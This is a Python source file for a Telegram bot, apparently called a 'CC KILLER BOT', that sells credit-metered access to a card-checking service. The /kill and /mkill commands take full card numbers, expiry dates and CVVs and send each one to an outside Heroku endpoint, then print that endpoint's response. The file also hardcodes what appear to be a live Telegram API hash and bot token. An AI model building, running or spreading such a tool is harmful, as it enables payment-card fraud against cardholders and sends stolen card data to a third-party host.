from pyrogram import Client, filters
import requests
import time

app = Client(
    "my_bot",
    api_id=24509589,
    api_hash="717cf21d94c4934bcbe1eaa1ad86ae75",
    bot_token="7386696229:AAFwcMx6q3xr5lY5daaTdvLLgqR_cDIfSjs"
)

OWNER_ID = 7427691214

user_credits = {}

@app.on_message(filters.command("add") & filters.user(OWNER_ID))
def add_credits(client, message):
    try:
        _, user_id, credits = message.text.split(" ")
        user_id = int(user_id)
        credits = int(credits)

        user_credits[user_id] = credits
        message.reply_text(f"**User {user_id} has been assigned {credits} credits.**")
    except ValueError:
        message.reply_text("**Invalid command format. Use: /add id_number credits**")

@app.on_message(filters.command("remove") & filters.user(OWNER_ID))
def remove_credits(client, message):
    try:
        _, user_id, credits = message.text.split(" ")
        user_id = int(user_id)
        credits = int(credits)

        if user_id in user_credits:
            user_credits[user_id] -= credits
            if user_credits[user_id] <= 0:
                del user_credits[user_id]
            message.reply_text(f"**Removed {credits} credits from user {user_id}.**")
        else:
            message.reply_text(f"**User {user_id} not found.**")
    except ValueError:
        message.reply_text("**Invalid command format. Use: /remove id_number credits**")

@app.on_message(filters.command("start"))
def start_command(client, message):
    message.reply_text("**WELCOME TO THE CC KILLER BOT. USE COMMAND /kill cc|mm|yyyy|cvv**")

@app.on_message(filters.command("kill") & (filters.text | filters.reply))
def kill_gate(client, message):
    user_id = message.from_user.id

    if user_id == OWNER_ID:
        is_owner = True
    else:
        credits = user_credits.get(user_id, 0)
        is_owner = False

        if credits <= 0:
            message.reply_text("**You don't have enough credits to use this command.**")
            return

    if message.reply_to_message:
        card_details = message.reply_to_message.text.strip()
    else:
        card_details = message.text.split(" ", 1)[1].strip()

    if not card_details or "|" not in card_details:
        message.reply_text("**Invalid CC format. Please use the correct format: cc|mm|yyyy|cvv**")
        return

    processing_message = message.reply_text("**CC KILLER GATE\nProcessing your request...**")

    final_result = ""

    for i in range(5):
        time.sleep(1)

        url = f"https://ugin-376ec3a40d16.herokuapp.com/cvv?cc={card_details}"
        response = requests.get(url)

        if response.status_code == 200:
            data = response.json()
            full_card_details = card_details
            error_code = data["error"]["code"]
            error_message = data["error"]["message"]

            final_result = f"""
**┏━━━━━━━⍟
┃#CC KILL GATE ☠️
┗━━━━━━━━━━━⊛
CARD:- {full_card_details}
RESPONSE:- {error_code}
MSG:- {error_message}**
"""
        else:
            final_result = "**Failed to connect to the API. Please try again later.**"

        if not is_owner:
            user_credits[user_id] -= 1

    processing_message.edit_text(final_result)

@app.on_message(filters.command("mkill") & (filters.text | filters.reply))
def multi_kill_gate(client, message):
    user_id = message.from_user.id

    if user_id == OWNER_ID:
        is_owner = True
    else:
        credits = user_credits.get(user_id, 0)
        is_owner = False

        if credits <= 0:
            message.reply_text("**You don't have enough credits to use this command.**")
            return

    if message.reply_to_message:
        mkill_details = message.reply_to_message.text.strip().split("\n")
    else:
        parts = message.text.split(" ", 2)
        if len(parts) < 3:
            message.reply_text("**Invalid command format. Use: /mkill max_cards cc1|mm1|yyyy1|cvv1\\ncc2|mm2|yyyy2|cvv2 ...**")
            return

        max_cards = int(parts[1])
        mkill_details = parts[2].strip().split("\n")

    if max_cards > len(mkill_details):
        max_cards = len(mkill_details)

    results = []
    for i in range(min(max_cards, 10)):
        card_details = mkill_details[i].strip()

        if not card_details or "|" not in card_details:
            results.append(f"**Invalid CC format for card {i+1}: {card_details}**")
            continue

        url = f"https://ugin-376ec3a40d16.herokuapp.com/cvv?cc={card_details}"
        response = requests.get(url)

        if response.status_code == 200:
            data = response.json()
            error_code = data["error"]["code"]
            error_message = data["error"]["message"]

            result = f"""
**┏━━━━━━━⍟
┃#CC KILL GATE ☠️
┗━━━━━━━━━━━⊛
CARD:- {card_details}
RESPONSE:- {error_code}
MSG:- {error_message}**
"""
            results.append(result)
        else:
            results.append(f"**Failed to connect to the API for card {i+1}.**")

        if not is_owner:
            user_credits[user_id] -= 1

    final_result = "\n".join(results)
    message.reply_text(final_result)

@app.on_message(filters.command("info"))
def user_info(client, message):
    user_id = message.from_user.id
    user = message.from_user
    username = user.username if user.username else "No username"
    mention = user.mention
    credits = user_credits.get(user_id, 0)

    message.reply_text(f"""
**Username**: {username}
**Mention**: {mention}
**Total Credits**: {credits}
**ID Number**: {user_id}
""")

@app.on_message(filters.command("user") & filters.user(OWNER_ID))
def get_all_users_info(client, message):
    if not user_credits:
        message.reply_text("**No users found.**")
        return

    results = []
    for user_id, credits in user_credits.items():
        try:
            user = client.get_users(user_id)
            username = user.username if user.username else "No username"
            mention = user.mention

            results.append(f"**User ID**: {user_id}\n**Username**: {username}\n**Total Credits**: {credits}\n")
        except Exception as e:
            results.append(f"**Failed to retrieve data for User ID {user_id}: {str(e)}**")

    final_result = "\n".join(results)
    message.reply_text(final_result)

app.run()
